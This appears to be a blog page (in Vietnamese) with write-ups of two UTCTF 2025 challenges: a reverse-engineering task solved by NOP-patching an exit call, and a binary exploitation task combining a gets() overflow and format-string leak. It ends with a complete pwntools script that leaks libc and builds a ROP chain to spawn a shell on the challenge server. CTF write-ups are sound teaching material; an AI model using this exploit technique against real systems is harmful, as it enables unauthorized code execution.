@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>UTCTF 2025 - Cr0nica1</title><meta name="Description" content="Research blog about CTF, Web Security, and Reverse Engineering"><meta property="og:url" content="https://cr0nica1.github.io/posts/utctf/">
+  <meta property="og:site_name" content="Cr0nica1">
+  <meta property="og:title" content="UTCTF 2025">
+  <meta property="og:description" content="Giải này mình tham gia song song với K!nd4SUS CTF 2025 nên không có giải được nhiều. Tuy nhiên mình vẫn có 1 chall dễ rev và 1 chall pwn.
+Ostrich Algorithm - reverse engineering 1. Analysis Sử dụng IDA pro mở file thì ở hàm start mình nhìn thấy được đoạn mã giả như sau:
+Do chương trình này Statically linked, cộng với các tham số truyền vào hàm sub_404000 nên mình đoán có vẻ đây là 1 hàm giống _libc_start_main. Đọc kỹ hơn bên trong thì mình gần như chắc chắn điều đó, do vậy có vẻ hàm Sub_401775 sẽ là hàm main.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-16T03:03:35+07:00">
+    <meta property="article:modified_time" content="2025-04-16T03:03:35+07:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="UTCTF 2025">
+  <meta name="twitter:description" content="Giải này mình tham gia song song với K!nd4SUS CTF 2025 nên không có giải được nhiều. Tuy nhiên mình vẫn có 1 chall dễ rev và 1 chall pwn.
+Ostrich Algorithm - reverse engineering 1. Analysis Sử dụng IDA pro mở file thì ở hàm start mình nhìn thấy được đoạn mã giả như sau:
+Do chương trình này Statically linked, cộng với các tham số truyền vào hàm sub_404000 nên mình đoán có vẻ đây là 1 hàm giống _libc_start_main. Đọc kỹ hơn bên trong thì mình gần như chắc chắn điều đó, do vậy có vẻ hàm Sub_401775 sẽ là hàm main.">
+<meta name="application-name" content="Cr0nica1">
+<meta name="apple-mobile-web-app-title" content="Cr0nica1"><meta name="theme-color" content="#000000"><meta name="msapplication-TileColor" content="#111111"><link rel="icon" href="/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#00ffff"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cr0nica1.github.io/posts/utctf/" /><link rel="prev" href="https://cr0nica1.github.io/posts/intro/" /><link rel="next" href="https://cr0nica1.github.io/posts/htb/" /><link rel="stylesheet" href="/css/style.min.49088c0fd33ec2f46f197451ea52e0cafa9bc6da2935c1144274ca89e79def3ed9f0c56fa78d4677d7a18208583ff518a21f8e035769334b81410737214c5443.css" integrity="sha512-SQiMD9M+wvRvGXRR6lLgyvqbxtopNcEUQnTKieed7z7Z8MVvp41Gd9ehgghYP/UYoh+OA1dpM0uBQQc3IUxUQw=="><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "UTCTF 2025",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/cr0nica1.github.io\/posts\/utctf\/"
+        },"genre": "posts","wordcount":  580 ,
+        "url": "https:\/\/cr0nica1.github.io\/posts\/utctf\/","datePublished": "2025-04-16T03:03:35+07:00","dateModified": "2025-04-16T03:03:35+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "cr0nica1"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cr0nica1"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="search..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cr0nica1"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="search..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">UTCTF 2025</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yourusername" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cr0nica1</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-16">2025-04-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;580 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;<span id="/posts/utctf/" class="leancloud_visitors" data-flag-title="UTCTF 2025">
+                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ostrich-algorithm---reverse-engineering">Ostrich Algorithm - reverse engineering</a>
+      <ul>
+        <li><a href="#1-analysis">1. Analysis</a></li>
+        <li><a href="#2-patch-byte">2. Patch byte</a></li>
+      </ul>
+    </li>
+    <li><a href="#retirement-plan---binary-exploitation">RETirement plan - binary exploitation</a>
+      <ul>
+        <li><a href="#1-vulnerability">1. Vulnerability</a></li>
+        <li><a href="#2-analysis">2. Analysis</a></li>
+        <li><a href="#3-exploitation">3. Exploitation</a></li>
+        <li><a href="#4-script">4. Script</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Giải này mình tham gia song song với K!nd4SUS CTF 2025 nên không có giải được nhiều. Tuy nhiên mình vẫn có 1 chall dễ rev và 1 chall pwn.</p>
+<h2 id="ostrich-algorithm---reverse-engineering">Ostrich Algorithm - reverse engineering</h2>
+<h3 id="1-analysis">1. Analysis</h3>
+<p>Sử dụng IDA pro mở file thì ở hàm start mình nhìn thấy được đoạn mã giả như sau:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png, http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png 1.5x, http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png"
+        title="http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png" /></p>
+<p>Do chương trình này Statically linked, cộng với các tham số truyền vào hàm sub_404000 nên mình đoán có vẻ đây là 1 hàm giống _libc_start_main. Đọc kỹ hơn bên trong thì mình gần như chắc chắn điều đó, do vậy có vẻ hàm Sub_401775 sẽ là hàm main.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png, http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png 1.5x, http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png"
+        title="http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png" /></p>
+<p>Bên trong hàm sub_401775 mình thấy chương trình so sánh chuỗi &ldquo;welcome to UTCTF!&rdquo; và chuỗi &ldquo;oiiaoiiaoiiaoiia&rdquo;, nếu không giống nhau sẽ gọi sub_40c90. Kiểm tra bên trong hàm này cùng với thử đặt breakpoint tại đây khi debug, mình nhận ra hàm sub_401775 sẽ thoát chương trình. Như vậy chương trình sẽ luôn dừng ở đây. Do đó ý tưởng ban đầu là mình thử patch byte xem sao.</p>
+<h3 id="2-patch-byte">2. Patch byte</h3>
+<p>Mình patch toàn bộ lệnh gọi hàm sub_401775 bằng nop.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png, http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png 1.5x, http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png"
+        title="http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png" /></p>
+<p>Thay toàn bộ byte ở đây thành 0x90.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png, http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png 1.5x, http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png"
+        title="http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png" /></p>
+<p>Mình cho chạy thử chương trình ở đây và nhận được flag.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png, http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png 1.5x, http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png"
+        title="http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png" /></p>
+<h2 id="retirement-plan---binary-exploitation">RETirement plan - binary exploitation</h2>
+<h3 id="1-vulnerability">1. Vulnerability</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png, http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png 1.5x, http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png"
+        title="http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png" /></p>
+<p>Nhìn vào pseudocode, mình nhận thấy một lỗi bof ở hàm gets() và lỗi format string ở hàm printf.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png, http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png 1.5x, http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png"
+        title="http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png" /></p>
+<p>Checksec chương trình nhận thấy không có bất kỳ một mitigation nào, ngoại trừ Partial RELRO. Do đó chall này có rất nhiều phương án, phương án của mình trình bày ở đây là sử dụng ROP.</p>
+<h3 id="2-analysis">2. Analysis</h3>
+<p>Vòng lặp for ngay bên dưới hàm gets là một thuật toán xử lý để lọc các ký tự độc hại nhằm khai thác format string. Tuy nhiên thay vì kiểm tra string format, chương trình lại gán format vào con trỏ v5 và thực hiện rà soát string vào con trỏ v5. Không những vậy, vòng lặp sẽ chạy đến khi v5[i] có giá trị NULL. Như vậy ý tưởng của mình sẽ là ghi đè giá trị con trỏ v5 bằng 1 địa chỉ có quyền rw mà ở đấy toàn các giá trị NULL. Sau đó mình sẽ ghi đè ret_address bằng các gadget nhằm thực thi lại hàm main 1 lần nữa sau khi đã leak được địa chỉ libc trên qua format string.</p>
+<h3 id="3-exploitation">3. Exploitation</h3>
+<p>Payload đầu tiên của mình sẽ khai thác format string để leak giá trị trên stack, đồng thời ghi đè ret_address về hàm main 1 lần nữa. Trước tiên mình cần tìm 1 vùng nhớ có quyền rw mà toàn các giá trị NULL để gi đè v5.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png, http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png 1.5x, http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png"
+        title="http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png, http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png 1.5x, http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png"
+        title="http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png" /></p>
+<p>vậy là đã có vùng nhớ ghi đè vào v5. Mình sẽ thử gửi payload xem chúng ta thu được gì.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png, http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png 1.5x, http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png"
+        title="http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png, http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png 1.5x, http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png"
+        title="http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png" /></p>
+<p>Check giá trị thu được, chúng ta biết được rằng địa chỉ này là địa chỉ của hàm <em>IO_2_1_stdin</em> trong libc.</p>
+<p>việc còn lại khá là đơn giản, payload thứ 2 chúng ta chỉ cần ghi đè các gadget để thực thi system(/bin/sh) là xong.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png, http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png 1.5x, http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png"
+        title="http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png, http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png 1.5x, http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png"
+        title="http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png" /></p>
+<p>Kết nối vào máy remote ta thu được flag.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png"
+        data-srcset="http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png, http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png 1.5x, http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png 2x"
+        data-sizes="auto"
+        alt="http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png"
+        title="http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png" /></p>
+<h3 id="4-script">4. Script</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./shellcode_patched&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>rw_section<span style="color:#f92672">=</span><span style="color:#ae81ff">0x601000</span>
+</span></span><span style="display:flex;"><span>main<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400616</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;challenge.utctf.live&#39;</span>,<span style="color:#ae81ff">9009</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;Insert prompt here&gt;: &#39;</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%3$p &#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x601200</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span>p64(main)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>libc_base<span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_2_1_stdin_&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Leak: </span><span style="color:#e6db74">{</span>hex(leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;libc base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]<span style="color:#f92672">+</span>libc_base
+</span></span><span style="display:flex;"><span>binsh<span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span>next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000400793</span>
+</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span>pop_rdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#ae81ff">0x30</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x601200</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(pop_rdi)<span style="color:#f92672">+</span>p64(binsh)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(ret)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(system)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;Insert prompt here&gt;: &#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-04-16</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://cr0nica1.github.io/posts/utctf/" data-title="UTCTF 2025"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://cr0nica1.github.io/posts/utctf/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://cr0nica1.github.io/posts/utctf/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://cr0nica1.github.io/posts/utctf/" data-title="UTCTF 2025"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://cr0nica1.github.io/posts/utctf/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
